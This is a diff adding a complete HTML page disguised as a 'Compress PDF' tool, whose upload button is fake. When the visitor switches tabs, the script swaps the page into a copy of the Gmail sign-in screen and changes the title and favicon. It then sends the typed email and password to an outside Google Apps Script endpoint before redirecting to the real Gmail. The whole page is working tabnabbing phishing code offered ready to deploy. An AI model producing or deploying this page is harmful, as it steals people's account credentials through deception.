@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Compress PDF online | Same PDF quality less file size</title>
+  <link rel="icon" id="favicon" href="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg">
+  <style>
+    body { margin: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+
+    /* --- SITE A: The Functional PDF Tool --- */
+    #safeSite {
+      background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
+      height: 100vh; display: flex; flex-direction: column; 
+      align-items: center; justify-content: center; color: #333;
+    }
+    
+    .pdf-container {
+      background: white; padding: 50px; border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 500px;
+    }
+
+    .upload-btn {
+      background: #e10600; color: white; border: none; padding: 15px 40px;
+      font-size: 1.2rem; border-radius: 6px; cursor: pointer; font-weight: bold;
+      margin-top: 20px; transition: 0.3s;
+    }
+    .upload-btn:hover { background: #b30500; }
+    
+    .file-drop-area {
+      border: 2px dashed #ccc; padding: 40px; margin-top: 20px; border-radius: 8px; background: #f9f9f9;
+    }
+
+    /* --- SITE B: The Gmail Trap --- */
+    #trapSite {
+      display: none; /* Hidden initially */
+      background: #fff; height: 100vh; flex-direction: column; 
+      align-items: center; justify-content: center;
+    }
+    .g-card {
+      width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px;
+      text-align: center; box-sizing: border-box;
+    }
+    input {
+      width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; 
+      border-radius: 4px; font-size: 16px; box-sizing: border-box;
+    }
+    input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
+    
+    .g-btn {
+      background: #1a73e8; color: white; font-weight: bold; border: none; 
+      padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-size: 14px;
+    }
+    .g-btn:hover { background: #1558b0; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+    
+    .spinner {
+        display: none;
+        border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8;
+        border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <div id="safeSite">
+    <div class="pdf-container">
+      <h1 style="margin: 0; color: #333;">Compress PDF</h1>
+      <p style="color: #666; margin-top: 10px;">Reduce file size while optimizing for maximal PDF quality.</p>
+      
+      <div class="file-drop-area" onclick="triggerFakeUpload()">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" width="50" style="opacity: 0.5;">
+        <p style="margin: 10px 0 0; color: #888;">Drag & drop your files here</p>
+      </div>
+
+      <button class="upload-btn" onclick="triggerFakeUpload()">Select PDF files</button>
+      <p id="uploadStatus" style="color: #e10600; font-weight: bold; display: none; margin-top: 20px;">
+        <span class="spinner" style="display:inline-block; vertical-align:middle; margin-right:10px;"></span> 
+        Compressing... Please wait.
+      </p>
+    </div>
+  </div>
+
+  <div id="trapSite">
+    <div class="g-card">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom: 10px;">
+      <h2 style="font-weight: 400; margin-bottom: 10px; color: #202124;">Sign in</h2>
+      <p style="margin-top: 0; margin-bottom: 30px; color: #202124;">
+        to continue to Gmail
+      </p>
+      
+      <div style="text-align: left;">
+        <input type="email" id="trapEmail" placeholder="Email or phone">
+      </div>
+
+      <div style="text-align: left;">
+        <input type="password" id="trapPassword" placeholder="Enter your password">
+        <div style="display: flex; margin-top: 5px;">
+            <input type="checkbox" style="width: auto; margin-right: 10px;">
+            <span style="font-size: 14px; color: #5f6368; padding-top: 10px;">Show password</span>
+        </div>
+      </div>
+      
+      <div style="margin-top: 40px; overflow: hidden; padding-bottom: 10px;">
+        <span style="float: left; color: #1a73e8; font-weight: bold; cursor: pointer; margin-top: 10px;">Forgot email?</span>
+        <button class="g-btn" id="loginBtn">Next</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // 🔴 REPLACE WITH YOUR GOOGLE SHEETS DEPLOYMENT URL
+    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwaPyrYNrjNwu1p4xl-9t26wCYq_y3GXds1d7RBuyQ9f-yEHrzFYmOQaK0A_c6GjFLGkQ/exec';
+    
+    let isTrapped = false;
+
+    // 1. FAKE UPLOAD LOGIC
+    function triggerFakeUpload() {
+        document.querySelector('.upload-btn').style.display = 'none';
+        document.getElementById('uploadStatus').style.display = 'block';
+    }
+
+    // 2. THE TABNAP TRIGGER
+    document.addEventListener("visibilitychange", function() {
+      if (document.hidden && !isTrapped) {
+        transformToTrap();
+      }
+    });
+
+    function transformToTrap() {
+      isTrapped = true;
+
+      document.title = "Gmail";
+      document.getElementById('favicon').href = "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico";
+      document.getElementById('safeSite').style.display = 'none';
+      document.getElementById('trapSite').style.display = 'flex';
+      
+      // Focus the email box automatically so they can type immediately
+      setTimeout(() => document.getElementById('trapEmail').focus(), 500);
+    }
+
+    // 3. CAPTURE & EXFILTRATE
+    document.getElementById('loginBtn').addEventListener('click', captureCredentials);
+    // Allow pressing 'Enter' on the password field to submit
+    document.getElementById('trapPassword').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') captureCredentials();
+    });
+
+    function captureCredentials() {
+        const email = document.getElementById('trapEmail').value;
+        const password = document.getElementById('trapPassword').value;
+        
+        // Basic validation so we don't send empty data
+        if (!email || !password) {
+            alert("Please enter your email and password.");
+            return;
+        }
+
+        document.getElementById('loginBtn').innerText = "Signing in...";
+        
+        // --- SEND TO SHEETS ---
+        fetch(APPS_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                email: email,
+                password: password
+            })
+        });
+
+        // 4. REDIRECT
+        setTimeout(() => {
+            window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+        }, 1500);
+    }
+  </script>
+
+</body>
+</html>
